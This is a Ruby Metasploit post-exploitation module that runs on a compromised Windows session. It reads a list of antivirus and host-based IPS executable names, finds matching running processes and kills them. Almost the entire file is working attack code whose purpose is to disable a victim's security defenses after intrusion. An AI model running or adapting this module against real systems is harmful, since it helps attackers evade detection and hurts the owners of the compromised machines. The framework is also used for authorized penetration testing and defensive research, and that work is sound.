##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::Process

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Post Kill Antivirus and Hips',
        'Description' => %q{
          This module attempts to locate and terminate any processes that are identified
          as being Antivirus or Host-based IPS related.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Marc-Andre Meloche (MadmanTM)',
          'Nikhil Mittal (Samratashok)',
          'Jerome Athias',
          'OJ Reeves'
        ],
        'Platform' => ['win'],
        'SessionTypes' => %w[meterpreter powershell shell],
        'Notes' => {
          'Stability' => [OS_RESOURCE_LOSS],
          'Reliability' => [],
          'SideEffects' => []
        },
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              stdapi_sys_process_get_processes
              stdapi_sys_process_kill
            ]
          }
        }
      )
    )
  end

  def run
    avs = ::File.read(
      ::File.join(
        Msf::Config.data_directory,
        'wordlists',
        'av_hips_executables.txt'
      )
    )
    avs = avs.strip.downcase.split("\n").uniq

    skip_processes = [
      '[system process]',
      'system'
    ]

    av_processes = get_processes.reject { |p| skip_processes.include?(p['name'].downcase) }.keep_if { |p| avs.include?(p['name'.downcase]) }
    if av_processes.empty?
      print_status('No target processes were found.')
      return
    end

    processes_killed = 0
    av_processes.each do |x|
      process_name = x['name']
      pid = x['pid']

      print_status("Attempting to terminate '#{process_name}' (PID: #{pid}) ...")
      if kill_process(pid)
        processes_killed += 1
        print_good("#{process_name} (PID: #{pid}) terminated.")
      else
        print_error("Failed to terminate '#{process_name}' (PID: #{pid}).")
      end
    end

    print_good("A total of #{av_processes.length} process(es) were discovered, #{processes_killed} were terminated.")
  end
end
